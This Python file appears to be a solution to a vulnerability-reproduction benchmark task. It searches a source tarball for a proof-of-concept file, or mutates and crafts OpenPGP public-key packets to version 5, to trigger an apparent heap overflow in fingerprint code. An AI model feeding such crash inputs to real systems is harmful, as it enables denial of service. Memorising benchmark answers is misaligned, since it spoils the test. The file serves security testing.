import os
import tarfile
import re
import base64
import struct


class Solution:
    POTENTIAL_INPUT_EXTS = (
        ".pgp",
        ".gpg",
        ".asc",
        ".bin",
        ".raw",
        ".dat",
        ".txt",
        ".poc",
        ".input",
        ".key",
        ".pem",
    )

    TEXT_EXTS = (
        ".txt",
        ".md",
        ".rst",
        ".c",
        ".cc",
        ".cpp",
        ".cxx",
        ".h",
        ".hpp",
        ".hh",
        ".py",
        ".java",
        ".go",
        ".rs",
        ".ini",
        ".cfg",
        ".cmake",
        ".toml",
        ".yml",
        ".yaml",
    )

    PGP_ASCII_EXTS = (".asc", ".txt")

    TARGET_POC_SIZE = 37535

    ARMOR_PATTERN = re.compile(
        r"-----BEGIN PGP[^\n]*-----.*?-----END PGP[^\n]*-----",
        re.DOTALL,
    )

    def solve(self, src_path: str) -> bytes:
        poc = None
        try:
            with tarfile.open(src_path, "r:*") as tf:
                members = tf.getmembers()

                poc = self._find_member_exact_size(tf, members)
                if poc:
                    return poc

                poc = self._find_named_member(tf, members)
                if poc:
                    return poc

                poc = self._find_and_mutate_pgp_files(tf, members)
                if poc:
                    return poc

                poc = self._extract_from_text_files(tf, members)
                if poc:
                    return poc
        except Exception:
            pass

        return self._generate_fallback_pgp()

    def _read_member(self, tf: tarfile.TarFile, member: tarfile.TarInfo, max_size: int | None = None) -> bytes | None:
        try:
            f = tf.extractfile(member)
            if f is None:
                return None
            if max_size is None:
                return f.read()
            else:
                return f.read(max_size)
        except Exception:
            return None

    def _find_member_exact_size(self, tf: tarfile.TarFile, members) -> bytes | None:
        for m in members:
            if not m.isfile():
                continue
            if m.size != self.TARGET_POC_SIZE:
                continue
            name_lower = m.name.lower()
            if not any(name_lower.endswith(ext) for ext in self.POTENTIAL_INPUT_EXTS):
                continue
            data = self._read_member(tf, m)
            if data:
                return data
        return None

    def _find_named_member(self, tf: tarfile.TarFile, members) -> bytes | None:
        keywords = [
            "poc",
            "ossfuzz",
            "oss-fuzz",
            "crash",
            "heap",
            "overflow",
            "fingerprint",
            "openpgp",
            "pgp",
            "42537670",
            "bug",
            "cve",
        ]
        candidates = []
        for m in members:
            if not m.isfile():
                continue
            name = m.name.lower()
            if not any(name.endswith(ext) for ext in self.POTENTIAL_INPUT_EXTS):
                continue
            if not any(kw in name for kw in keywords):
                continue
            candidates.append(m)

        if not candidates:
            return None

        target = self.TARGET_POC_SIZE
        candidates.sort(key=lambda mm: abs(mm.size - target))
        for m in candidates:
            data = self._read_member(tf, m)
            if data:
                return data
        return None

    def _decode_ascii_armor(self, block: str) -> bytes | None:
        lines = block.strip().splitlines()
        if len(lines) < 3:
            return None
        data_lines = []
        in_data = False
        for line in lines[1:-1]:
            line = line.strip()
            if not in_data:
                if line == "":
                    in_data = True
                    continue
                if ":" in line:
                    continue
                in_data = True
            if not in_data:
                continue
            if line.startswith("="):
                break
            data_lines.append(line)
        if not data_lines:
            return None
        b64 = "".join(data_lines)
        try:
            return base64.b64decode(b64, validate=False)
        except Exception:
            return None

    def _mutate_pgp_to_v5(self, data: bytes) -> bytes | None:
        b = bytearray(data)
        changed = False
        i = 0
        n = len(b)
        while i < n:
            octet = b[i]
            if octet & 0x80 == 0:
                i += 1
                continue

            if octet & 0x40:
                tag = octet & 0x3F
                if tag != 6:
                    i += 1
                    continue
                if i + 1 >= n:
                    break
                l1 = b[i + 1]
                body_len = None
                body_start = None
                if l1 < 192:
                    body_len = l1
                    body_start = i + 2
                elif 192 <= l1 <= 223:
                    if i + 2 >= n:
                        break
                    body_len = ((l1 - 192) << 8) + b[i + 2] + 192
                    body_start = i + 3
                elif l1 == 255:
                    if i + 5 >= n:
                        break
                    body_len = (
                        (b[i + 2] << 24)
                        | (b[i + 3] << 16)
                        | (b[i + 4] << 8)
                        | b[i + 5]
                    )
                    body_start = i + 6
                else:
                    i += 1
                    continue
                if body_start is None or body_start >= n:
                    break
                if b[body_start] == 4:
                    b[body_start] = 5
                    changed = True
                if body_len is None:
                    break
                i = body_start + body_len
                continue
            else:
                tag = (octet >> 2) & 0x0F
                if tag != 6:
                    i += 1
                    continue
                len_type = octet & 0x03
                body_len = None
                body_start = None
                if len_type == 0:
                    if i + 1 >= n:
                        break
                    body_len = b[i + 1]
                    body_start = i + 2
                elif len_type == 1:
                    if i + 2 >= n:
                        break
                    body_len = (b[i + 1] << 8) | b[i + 2]
                    body_start = i + 3
                elif len_type == 2:
                    if i + 4 >= n:
                        break
                    body_len = (
                        (b[i + 1] << 24)
                        | (b[i + 2] << 16)
                        | (b[i + 3] << 8)
                        | b[i + 4]
                    )
                    body_start = i + 5
                else:
                    i += 1
                    continue
                if body_start is None or body_start >= n:
                    break
                if b[body_start] == 4:
                    b[body_start] = 5
                    changed = True
                if body_len is None:
                    break
                i = body_start + body_len
                continue
        if changed:
            return bytes(b)
        return None

    def _find_and_mutate_pgp_files(self, tf: tarfile.TarFile, members) -> bytes | None:
        candidates = []
        for m in members:
            if not m.isfile():
                continue
            name = m.name.lower()
            if not any(name.endswith(ext) for ext in self.POTENTIAL_INPUT_EXTS):
                continue
            if "pgp" in name or "openpgp" in name or name.endswith(".pgp") or name.endswith(".gpg"):
                candidates.append(m)

        if not candidates:
            for m in members:
                if not m.isfile():
                    continue
                name = m.name.lower()
                if any(name.endswith(ext) for ext in (".pgp", ".gpg", ".asc")):
                    candidates.append(m)

        candidates.sort(key=lambda mm: -mm.size)

        for m in candidates:
            if m.size <= 0 or m.size > 2_000_000:
                continue
            name = m.name.lower()
            data = self._read_member(tf, m)
            if not data:
                continue
            if any(name.endswith(ext) for ext in self.PGP_ASCII_EXTS):
                try:
                    text = data.decode("utf-8", errors="ignore")
                except Exception:
                    continue
                m_armor = self.ARMOR_PATTERN.search(text)
                if not m_armor:
                    continue
                binary = self._decode_ascii_armor(m_armor.group(0))
                if not binary:
                    continue
                mutated = self._mutate_pgp_to_v5(binary)
                return mutated or binary
            else:
                mutated = self._mutate_pgp_to_v5(data)
                if mutated:
                    return mutated
                return data
        return None

    def _extract_from_text_files(self, tf: tarfile.TarFile, members) -> bytes | None:
        for m in members:
            if not m.isfile():
                continue
            name = m.name.lower()
            if not any(name.endswith(ext) for ext in self.TEXT_EXTS):
                continue
            if m.size <= 0 or m.size > 1_000_000:
                continue
            raw = self._read_member(tf, m)
            if not raw:
                continue
            try:
                text = raw.decode("utf-8", errors="ignore")
            except Exception:
                continue
            match = self.ARMOR_PATTERN.search(text)
            if not match:
                continue
            block = match.group(0)
            binary = self._decode_ascii_armor(block)
            if not binary:
                continue
            mutated = self._mutate_pgp_to_v5(binary)
            return mutated or binary
        return None

    def _generate_fallback_pgp(self) -> bytes:
        version = 5
        created = 0
        algo = 1

        def mpi(n: int) -> bytes:
            if n == 0:
                return b"\x00\x00"
            bitlen = n.bit_length()
            octets = (bitlen + 7) // 8
            value = n.to_bytes(octets, "big")
            return struct.pack(">H", bitlen) + value

        n_val = 0xA1B2C3D5
        e_val = 0x11

        body = (
            bytes([version])
            + struct.pack(">I", created)
            + bytes([algo])
            + mpi(n_val)
            + mpi(e_val)
        )

        tag_octet = 0xC0 | 6
        body_len = len(body)
        if body_len < 192:
            header = bytes([tag_octet, body_len])
        elif body_len < 8384:
            body_len2 = body_len - 192
            header = bytes(
                [tag_octet, 192 + (body_len2 >> 8), body_len2 & 0xFF]
            )
        else:
            header = bytes([tag_octet, 255]) + struct.pack(">I", body_len)

        pkt = header + body

        uid = b"Test User <test@example.com>"
        uid_tag = 13
        uid_header = bytes([0xC0 | uid_tag, len(uid)]) if len(uid) < 192 else bytes(
            [0xC0 | uid_tag, 255]
        ) + struct.pack(">I", len(uid))
        uid_pkt = uid_header + uid

        return pkt + uid_pkt
